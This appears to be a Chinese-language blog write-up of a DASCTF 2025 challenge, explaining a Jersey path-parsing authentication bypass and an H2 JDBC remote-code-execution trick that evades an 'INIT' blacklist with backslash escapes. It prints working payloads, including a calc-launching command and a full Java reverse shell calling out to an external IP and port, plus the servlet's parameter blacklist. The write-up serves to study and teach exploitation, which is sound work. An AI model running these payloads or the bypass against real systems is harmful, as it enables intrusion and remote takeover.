@@ -1,0 +1,878 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="无聊ini">
+    <meta name="author" content="follycat">
+    <meta name="referrer" content="no-referrer" />
+    
+    <title>
+        
+            2025-DASCTF 2025上半年赛-泽西岛(H2 JDBC RCE漏洞分析) |
+        
+        follycatのblog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/wul.jpg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"follycatのblog","author":"follycat","avatar":"/images/wul.jpg","logo":"/images/wul.jpg","favicon":"/images/wul.jpg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"If you're reading this, welcome to my blog!","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/wul.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               follycatのblog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="menu-text-color fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        2025-DASCTF 2025上半年赛-泽西岛(H2 JDBC RCE漏洞分析)
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/wul.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">follycat</span>
+                                
+                                    <span class="author-badge">Lv2</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-06-23 22:50:30</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Fri Jun 27 2025 05:33:00 GMT+0800">2025-06-27 05:33:00</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>2k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>9 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>由于需要进行本地调试，这里进行tomcat本地环境搭建。</p>
+<p>题目给了一个war包，将其放入tomcat的webapp中，并在startup.bat中加入debug。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005</span><br></pre></td></tr></table></figure>
+
+<p>启动环境即可开启远程调试。</p>
+<p>此外在idea中需要将lib以及classes添加为库，再开启jvm调试。</p>
+<h1 id="绕过鉴权"><a href="#绕过鉴权" class="headerlink" title="绕过鉴权"></a>绕过鉴权</h1><p>首先看到web.xml，其中有一些配置信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; version=&quot;3.1&quot;&gt;</span><br><span class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;Jersey Web Application&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.glassfish.jersey.servlet.ServletContainer&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">      &lt;param-name&gt;jersey.config.server.provider.packages&lt;/param-name&gt;</span><br><span class="line">      &lt;param-value&gt;com.example.gfctf&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;Jersey Web Application&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/api/*&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/404.jsp&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;500&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/500.jsp&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;401&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/401.jsp&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;405&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/405.jsp&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>
+
+<p>从中我们可以发现该项目是使用的<code>Jersey</code>框架，并且定义了 Servlet的映射规则。</p>
+<p>然后可以看到<code>AuthenticationFilter</code>类，这个类是一个拦截器，并且实现了一些鉴权的功能。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750576258091-84c824ca-0ee5-4881-9e76-349c19203a3c.png"></p>
+<p>通过解读代码，可以发现拦截器验证JWT验证的条件为当路由不在拦截器里并且路由不为文件，也就是说这俩个条件任意满足一个即可不触发JWT的验证，首先知道他的白名单为<code>&quot;&quot;, &quot;test&quot;, &quot;login&quot;, &quot;register&quot;</code>，这些路由是不需要进行JWT验证的，而触发JDBC的路由为<code>/testConnect</code>很明显是不在白名单里的，因此可以尝试让<code>isBaseFile</code>返回ture。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private static boolean isBaseFile(String path) &#123;</span><br><span class="line">    return !path.contains(&quot;/&quot;) &amp;&amp; path.contains(&quot;.&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>isBaseFile</code>的判断，需要路径中不包含&#x2F;并且路径包含.字符。</p>
+<p>这里利用的是<code>Jersey</code>框架的路径解析的问题进行绕过的，可以看到<code>filter</code>方法中的第一行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String path = containerRequestContext.getUriInfo().getPath();</span><br></pre></td></tr></table></figure>
+
+<p>这是基于<code>ContainerRequestContext</code>实现的获取请求Path的方法，并且使用的是<code>getUriInfo().getPath();</code>这会直接返回请求的路径部分，比如请求为<a class="link" target="_blank" rel="noopener" href="http://127.0.0.1/api/test;test%EF%BC%8C%E5%B0%86%E4%BC%9A%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9Eapi/test;test/%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E8%AF%A5%E7%89%B9%E6%80%A7%E6%9D%A5%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%E9%89%B4%E6%9D%83%E7%9A%84%E6%93%8D%E4%BD%9C%E3%80%82">http://127.0.0.1/api/test;test，将会直接返回api/test;test/，因此可以利用该特性来进行绕过鉴权的操作。<i class="fas fa-external-link-alt"></i></a></p>
+<p>这里使用;来截断，并且使用.让<code>isBaseFile</code>为true，从而绕过鉴权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/api/testConnect;.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750581423021-1601bfd5-0174-49be-9b7f-25087ccd3b73.png"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750591879958-dfcd201c-af04-4235-85d1-bbf885606244.png"></p>
+<h1 id="H2-JDBC-RCE原理-payload构造"><a href="#H2-JDBC-RCE原理-payload构造" class="headerlink" title="H2 JDBC RCE原理+payload构造"></a>H2 JDBC RCE原理+payload构造</h1><p>绕过鉴权之后，可以访问到目标路由<code>/testConnect</code>了，看到<code>JDBCServlet</code>类。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">package com.example.gfctf.controller;</span><br><span class="line"></span><br><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.SQLException;</span><br><span class="line">import java.util.Iterator;</span><br><span class="line">import java.util.List;</span><br><span class="line">import java.util.stream.Collectors;</span><br><span class="line">import java.util.stream.Stream;</span><br><span class="line">import javax.ws.rs.FormParam;</span><br><span class="line">import javax.ws.rs.POST;</span><br><span class="line">import javax.ws.rs.Path;</span><br><span class="line">import javax.ws.rs.Produces;</span><br><span class="line"></span><br><span class="line">@Path(&quot;/testConnect&quot;)</span><br><span class="line">public class JDBCServlet &#123;</span><br><span class="line">    private static final List&lt;String&gt; DEFAULT_JDBC_DISALLOWED_PARAMETERS = (List)Stream.of(&quot;allowLoadLocalInfileInPath&quot;, &quot;allowUrlInLocalInfile&quot;, &quot;allowPublicKeyRetrieval&quot;, &quot;autoDeserialize&quot;, &quot;queryInterceptors&quot;, &quot;allowLoadLocalInfile&quot;, &quot;allowMultiQueries&quot;, &quot;init&quot;, &quot;script&quot;, &quot;shutdown&quot;).map(String::toUpperCase).collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    public JDBCServlet() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void validateJdbcUrl(String jdbcUrl) throws IllegalArgumentException &#123;</span><br><span class="line">        Iterator var1 = DEFAULT_JDBC_DISALLOWED_PARAMETERS.iterator();</span><br><span class="line"></span><br><span class="line">        String disallowed;</span><br><span class="line">        do &#123;</span><br><span class="line">            if (!var1.hasNext()) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            disallowed = (String)var1.next();</span><br><span class="line">        &#125; while(!jdbcUrl.toUpperCase().contains(disallowed));</span><br><span class="line"></span><br><span class="line">        throw new IllegalArgumentException(&quot;JDBC URL &quot; + jdbcUrl + &quot; is invalid&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static boolean testConnect(String jdbcUrl) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            validateJdbcUrl(jdbcUrl);</span><br><span class="line">            Class.forName(&quot;org.h2.Driver&quot;);</span><br><span class="line">            Connection connection = DriverManager.getConnection(jdbcUrl);</span><br><span class="line"></span><br><span class="line">            boolean var2;</span><br><span class="line">            try &#123;</span><br><span class="line">                var2 = true;</span><br><span class="line">            &#125; catch (Throwable var5) &#123;</span><br><span class="line">                if (connection != null) &#123;</span><br><span class="line">                    try &#123;</span><br><span class="line">                        connection.close();</span><br><span class="line">                    &#125; catch (Throwable var4) &#123;</span><br><span class="line">                        var5.addSuppressed(var4);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                throw var5;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (connection != null) &#123;</span><br><span class="line">                connection.close();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return var2;</span><br><span class="line">        &#125; catch (SQLException | ClassNotFoundException | IllegalArgumentException var6) &#123;</span><br><span class="line">            Exception e = var6;</span><br><span class="line">            throw new RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @POST</span><br><span class="line">    @Produces(&#123;&quot;text/plain&quot;&#125;)</span><br><span class="line">    public String testConnectWithParams(@FormParam(&quot;jdbcUrl&quot;) String jdbcUrl) &#123;</span><br><span class="line">        if (jdbcUrl != null &amp;&amp; !jdbcUrl.isEmpty()) &#123;</span><br><span class="line">            if (!jdbcUrl.startsWith(&quot;jdbc:h2&quot;)) &#123;</span><br><span class="line">                throw new IllegalArgumentException(&quot;no supported JDBC URL&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                jdbcUrl = jdbcUrl + &quot;;FORBID_CREATION=TRUE&quot;;</span><br><span class="line">                return testConnect(jdbcUrl) ? &quot;Connection successful&quot; : &quot;Connection failed&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;jdbcUrl is null or empty&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码主要实现了数据库的连接测试操作，并且其中有一些过滤以及限制，首先其接收<code>jdbcUrl</code>参数，并且要求其以<code>jdbc:h2</code>开头，然后会在结尾加上<code>;FORBID_CREATION=TRUE</code>这一字符串，这段字符主要作用是禁止创建数据库，这里是需要绕过的，看p神的文章中是因为只要将分号使用反斜线转义，分号就会变成一个普通字符串。</p>
+<p>然后会进行一个黑名单的过滤操作，要求不能使用黑名单中的字符，这里主要就是要绕过INIT这个字符，从而进行RCE，这里使用的是&#x2F;进行绕过，具体原理在下面debug过程中进行分析。</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;IN\IT=CREATE ALIAS EXEC AS &#x27;void cmd_exec(String cmd) throws java.lang.Exception &#123;Runtime.getRuntime().exec(cmd)\;&#125;&#x27;\;CALL EXEC (&#x27;cmd /c calc&#x27;)\;AUTHZPWD=\</span><br></pre></td></tr></table></figure>
+
+<h2 id="H2-JDBC-RCE-绕过原理"><a href="#H2-JDBC-RCE-绕过原理" class="headerlink" title="H2 JDBC RCE \绕过原理"></a>H2 JDBC RCE \绕过原理</h2><p>这里的H2 JDBC RCE是来自于<a class="link" target="_blank" rel="noopener" href="https://github.com/dataease/dataease">dataease<i class="fas fa-external-link-alt"></i></a>这的fix。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750672940651-2af177a3-a29b-4d6c-8e36-7e074ed1f674.png"></p>
+<p>可以看到这里是将\进行了过滤操作，因此可以猜测\是可以进行RCE绕过的，这里来分析一下原理。</p>
+<p>传入参数并且在validateJdbcUrl处打下断点</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750668333193-ac589f7c-9588-4f89-9f75-aece1efc609e.png"></p>
+<p>可以跟到这个方法中进行分析</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750668503427-174f74da-e11b-4c97-bbc6-4b709d5d81e7.png"></p>
+<p>这里将上面的黑名单字符串与我们传入的字符串进行对比，如果有相匹配的就会爆出异常，如果没有就会正常走出当前方法。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750668472589-866741ad-d629-4d76-a8a0-2fbc6200af69.png"></p>
+<p>提前在<code>DriverManager</code>方法中打下断点，因为<code>DriverManager.getConnection</code>这里是无法打下断点的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750668783672-babf1c8e-ba8a-4c8d-991d-5494a55ac7a6.png"></p>
+<p>跳转到<code>DriverManager</code>中，一直步过，这些都是对url和类加载器进行一些操作，直接过掉就行。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750669956514-b54457de-309e-45e7-bbb9-9b5fcf0e4de1.png"></p>
+<p>直到<code>aDriver.driver.connect</code>，这里开始尝试连接，步入。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750670652077-4f31748a-69df-4e24-94d1-a02d8314b1b1.png"></p>
+<p>继续步入到JdbcConnection中。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750670704464-3f3679f2-a642-41b4-9506-668398e716b3.png"></p>
+<p>继续步入到<code>ConnectionInfo</code>。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750670807689-cecc65a6-46c4-420d-8c3a-7dd4c78fe412.png"></p>
+<p>一直步过，这里都是对url那些进行检查的。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750671043574-47668982-c456-4940-98a1-b252f3706e4f.png"></p>
+<p>一直过到<code>readSettingsFromURL</code>这个方法会从传入的数据库连接 URL 中解析并提取连接所需的其他配置或设置。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750672215496-a2b4070e-3a6d-45ef-9f6b-4f92ac05ca8c.png"></p>
+<p>这个H2的RCE漏洞的问题就是在于这个字符串提取和处理这里，进入<code>arraySplit</code>方法中。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750672295773-8356f8a9-8f4f-40f3-9a94-3825382dede2.png"></p>
+<p>可以发现var0就是传入的url字符串，并且其中的<code>INIT</code>还处于<code>IN\IT</code>字符，继续向下步过到处理INIT时。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750672513016-ab9c0206-1335-41b8-b601-444d2831ce64.png"></p>
+<p>可以看到<code>IN\IT</code>中的<code>\</code>已经消失不见了，这是因为它会“转义”紧随其后的字符。这样，<code>\I</code> 会被当作普通字符 <code>I</code>，而不是转义符。<code>StringBuilder</code> 中的 <code>var5</code> 会将 <code>I</code> 直接加进去，而不是跳过，从而实现了RCE，以及正常的命令执行。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750672702772-ebc32a44-cfcb-4798-81ee-65b0ceae1a1e.png"></p>
+<h2 id="反射payload"><a href="#反射payload" class="headerlink" title="反射payload"></a>反射payload</h2><p>反弹shell payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbcUrl=jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;IN\IT=CREATE ALIAS REV_SHELL AS &#x27;void rev_shell(String host, String port) throws java.lang.Exception &#123;String shell=System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)?&quot;cmd&quot;:&quot;sh&quot;\;Process p=new ProcessBuilder(shell).redirectErrorStream(true).start()\;java.net.Socket s=new java.net.Socket(host,Integer.valueOf(port))\;java.io.InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream()\;java.io.OutputStream po=p.getOutputStream(),so=s.getOutputStream()\;while(!s.isClosed())&#123;while(pi.available()&gt;0)&#123;so.write(pi.read())\;&#125;while(pe.available()&gt;0)&#123;so.write(pe.read())\;&#125;while(si.available()&gt;0)&#123;po.write(si.read())\;&#125;so.flush()\;po.flush()\;Thread.sleep(50)\;try&#123;p.exitValue()\;break\;&#125;catch(Exception e)&#123;&#125;&#125;p.destroy()\;s.close()\;&#125;&#x27;\;CALL REV_SHELL (&#x27;10.88.15.186&#x27;, &#x27;4444&#x27;)\;AUTHZPWD=\</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750601345029-836da9e4-d4aa-4833-9774-5f1363237e72.png"></p>
+<p>得到flag</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42934306/1750601360568-8bc9993a-3ffe-49cc-ac19-4357430b0de6.png"></p>
